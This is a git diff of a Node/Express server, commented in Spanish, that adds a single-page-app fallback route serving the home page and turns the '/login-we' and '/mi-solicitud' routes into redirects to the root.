@@ -253,16 +253,19 @@ if (LEGACY_DIR) {
   app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
   });
+  // SPA fallback: cualquier ruta no-API y sin extensión sirve la home
+  app.get('*', (req, res, next) => {
+    const isApi = req.path.startsWith('/otp') || req.path.startsWith('/start') || req.path.startsWith('/sync') || req.path.startsWith('/status') || req.path.startsWith('/form') || req.path.startsWith('/payment') || req.path.startsWith('/crm') || req.path.startsWith('/pago') || req.path.startsWith('/webhooks') || req.path.startsWith('/adapter.js');
+    const hasExt = path.extname(req.path);
+    if (!isApi && !hasExt && req.headers.accept && req.headers.accept.includes('text/html')) {
+      return res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    }
+    next();
+  });
 }
-// New login route (renamed)
-app.get('/login-we', (req, res) => {
-  res.set('Cache-Control', 'no-store');
-  res.sendFile(path.join(__dirname, 'public', 'login-we.html'));
-});
-// Backward-compat redirect
-app.get('/mi-solicitud', (req, res) => {
-  res.redirect(302, '/login-we');
-});
+// Forzar siempre a la página principal
+app.get('/login-we', (req, res) => res.redirect(302, '/'));
+app.get('/mi-solicitud', (req, res) => res.redirect(302, '/'));
 
 // Check if phone exists (proxy to CRM)
 app.get('/phone/exists', async (req, res) => {
